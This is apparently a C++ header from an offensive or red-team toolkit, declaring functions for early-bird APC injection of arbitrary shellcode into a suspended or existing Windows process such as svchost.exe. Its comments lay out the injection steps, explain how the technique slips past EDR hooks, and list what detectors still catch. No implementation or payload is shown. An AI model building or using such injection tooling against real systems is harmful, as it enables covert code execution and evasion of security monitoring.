#pragma once
#ifndef APCINJECT_H
#define APCINJECT_H
#include "common.h"

// APCInject — Early-bird APC injection (T1055.004).
//
// Classic CreateRemoteThread injection is heavily monitored.
// APC (Asynchronous Procedure Call) injection is a different code path:
//   - No CreateRemoteThread call (different ETW event, different EDR hook)
//   - Injects via NtQueueApcThread into a thread in alertable wait state
//
// "Early-bird" variant: create a NEW process in suspended state BEFORE the
// EDR has a chance to hook it, inject shellcode via APC, then resume.
// At resume time the APC fires BEFORE the process main entry point —
// the EDR hooks haven't been installed yet, so the shellcode runs clean.
//
// Flow:
//   1. CreateProcessA(target, ..., CREATE_SUSPENDED)  ← process exists, not running
//   2. VirtualAllocEx / WriteProcessMemory → shellcode in remote process
//   3. NtQueueApcThread on the main thread's handle → shellcode address
//   4. ResumeThread → APC fires first, then normal main() runs
//
// What a strong detector still catches:
//   - NtQueueApcThread is monitored via ETW and Sysmon EID 8 (CreateRemoteThread
//     and QueueUserAPC share the same Sysmon event in newer configs)
//   - CREATE_SUSPENDED + WriteProcessMemory + ResumeThread triplet = high signal
//   - Kernel-mode APC delivery callbacks in some EDRs
//
// MITRE T1055.004 — Asynchronous Procedure Call

namespace APCInject {
    // Inject `shellcode` into a freshly spawned `targetExe` process via early-bird APC.
    // targetExe: path to a signed Windows binary (e.g. C:\Windows\System32\svchost.exe)
    // Returns PID of the spawned process, or 0 on failure.
    DWORD EarlyBird(const char* targetExe, const BYTE* shellcode, SIZE_T scSize);

    // Inject into an existing process (PID) via APC queued to all its threads.
    // Less reliable (thread may not be in alertable wait), but no new process needed.
    std::string InjectExisting(DWORD pid, const BYTE* shellcode, SIZE_T scSize);

    // Demo: inject a MessageBoxA shellcode into svchost.exe to verify the path works.
    std::string Demo(const char* targetExe);
}

#endif
